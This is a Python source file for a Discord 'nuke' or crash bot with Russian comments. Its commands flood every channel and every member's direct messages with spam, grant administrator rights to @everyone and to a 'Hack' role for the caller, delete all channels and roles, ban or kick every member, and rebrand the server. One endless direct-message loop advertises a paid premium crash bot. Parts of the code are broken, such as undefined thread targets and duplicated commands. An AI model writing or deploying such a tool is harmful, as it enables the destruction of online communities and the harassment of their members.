import discord
import time
import random
import asyncio
import os
import threading
import keep_alive

import time
from discord import client
from config import settings
from discord.ext import commands
from discord.utils import get
from threading import Thread
from time import sleep
from tkinter import Tk, BOTH
from tkinter.ttk import Frame, Button, Style
from tkinter import *
# мне похуй на технологии
# главное чтобы на моих телефонах можно было играть в клэш раял -Стив Жопс
keep_alive.keep_alive()
class MyThread(Thread):
    """
    A threading example
    """

    def __init__(self, name):
        """Инициализация потока"""
        Thread.__init__(self)
        self.name = name

    def run(self):
        """Запуск потока"""
        amount = random.randint(3, 15)
        time.sleep(amount)
        msg = "%s is running" % self.name
        print(msg)


def create_threads():
    """
    Создаем группу потоков
    """
    for i in range(5):
        name = "Thread #%s" % (i + 1)
        my_thread = MyThread(name)
        my_thread.start()


if __name__ == "__main__":
    create_threads()

TOKEN = settings['token']
activity = discord.Game(name=settings['statustext'], type=1)
a = 0
b = 1
c = 1
d = 2

intents = discord.Intents.all()
client = discord.client
bot = commands.Bot(command_prefix = settings['prefix'], intents=intents)



@bot.event
async def on_ready():
    await bot.change_presence(status=settings['status'], activity=activity)
    print(f'Бот запущен. Ник бота: {bot.user}')



@bot.command()
async def spam(ctx, message='@everyone Вы крашнуты', time_alerting=1000):
    try:
        start_time = time.time()
        channels = ctx.guild.channels
        times_sent = 0
        while time.time() - start_time < time_alerting:
            for channel in channels:
                try:
                    await channel.send(str(message))
                    print("'" + message + "' sent to channel: '" + channel.name + "'.")
                    times_sent += 1
                except Exception as error:
                    try:
                        print("Couldn't alert to channel: '" + channel.name + "' ERROR = " + str(error))
                    finally:
                        error = None
                        del error

        print("'" + message + "' has been sent " + str(times_sent) + ' times in ' + str(time_alerting) + ' seconds.')
    except Exception as error:
        try:
            error = convert_error(error)
            print("Couldn't alert: '" + message + "' for " + str(time_alerting) + ' seconds. ERROR = ' + error + "\nDetailed error written to 'error_log.txt'.")
        finally:
            error = None
            del error

@bot.command()
async def delmessages(ctx, amount=settings['delmessagesamount']):
    await ctx.message.delete()  # Удаление сообщения автора
    await ctx.channel.purge(limit=amount) # очищаем

@bot.command()
async def spam_channel(ctx, name):
    await ctx.message.delete()
    for b in range(1):
        try:
            await ctx.guild.create_text_channel(name)
        except:
            continue

@bot.command()
async def admin_everyone(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)
@bot.command()
async def spam_role(ctx, name):
    await ctx.message.delete()
    create = 0
    uncreat = 0
    for role in range(100):
        try:
            uncreat += 1
            await ctx.guild.create_role(name=name)
            create += 1
        except:
            continue

@bot.command()
async def spamlsall(ctx, *, arg):
  for s in range(200):
   for m in ctx.guild.members:
        try:
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
            await m.send(arg)
        except:
            pass

@bot.command()
async def spamls( ctx, member: discord.Member, *, arg, ):
    await ctx.channel.purge( limit = 1 )
    for s in range(200):
      await member.send(arg)
      await member.send(arg) 
      await member.send(arg)
      await member.send(arg)
      await member.send(arg)
      await member.send(arg)
      await member.send(arg)
      await member.send(arg)
      await member.send(arg)


@bot.command()
async def memberslist(ctx):
        await ctx.send(ctx.guild.members.name+"#"+ctx.m.discriminator)
        await ctx.message.delete()  # Удаление сообщения автора

@bot.command()
async def admin_everyone(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)

@bot.command()
async def spam_ls(ctx, member: discord.Member):
    dm = await member.create_dm()
    while True:
        await dm.send("**JKtimosha#1837** *Создатель*, Если хочешь так же со своим текстом,  вот сервер, там команды и ссылка https://discord.gg/dHB4FFza3n Премиум бот 150р ||было 500р||")


@bot.command()
async def rename(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    with open('союзгорит.jpg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='Crash by Soviet Union', icon=icon)


@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    while a < b:
        for channel in ctx.guild.channels:                  # собираем
            await channel.delete(reason="Краш от Тимоши")   # удаление


@bot.command()
async def spamchannel(ctx, name):
        await ctx.message.delete()
        th.start()
        th1.start()
        while a < b:
            guild = ctx.message.guild
            await guild.create_text_channel(name)

th = Thread(target=spamchannels, args=())
th1 = Thread(target=spamchannels, args=())

@bot.command()
async def ban(ctx, member):
    await ctx.message.delete()
    for m in ctx.guild.members: #собираем
            await m.ban(m=member, reason="КРАШ!")#баним


@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="КРАШ!")#баним
        except:
            pass

@bot.command()
async def allkick(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members: #собираем
        try:
            await m.kick(reason="КРАШ!")#баним
        except:
            pass

@bot.command()
async def purge(ctx, amount=10000):
    await ctx.channel.purge(limit=amount)



@bot.command()
async def nuke(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="Так надо") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!nuke** \n Удалено {counter} каналов',
        colour = 0x0de7d9))


@bot.command()  # разрешаем передавать агрументы
async def getadmin(ctx):  # создаем асинхронную фунцию бота
    guild = ctx.guild
    perms = discord.Permissions(administrator=True, ban_members=True, kick_members=True)  # права роли
    await guild.create_role(name="Hack", permissions=perms)  # создаем роль
    role = discord.utils.get(ctx.guild.roles, name="Hack")  # находим роль по имени
    user = ctx.message.author  # находим юзера
    await user.add_roles(role)  # добовляем роль
    await ctx.message.delete()


@bot.command()
async def kick(ctx, member: discord.Member = None, reason = None):
        await ctx.send(f'вы кикнули {member.name}')
        await member.kick(reason=reason) 


@bot.command()
async def delroles(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="Так надо")
        except:
            pass






bot.run(TOKEN)
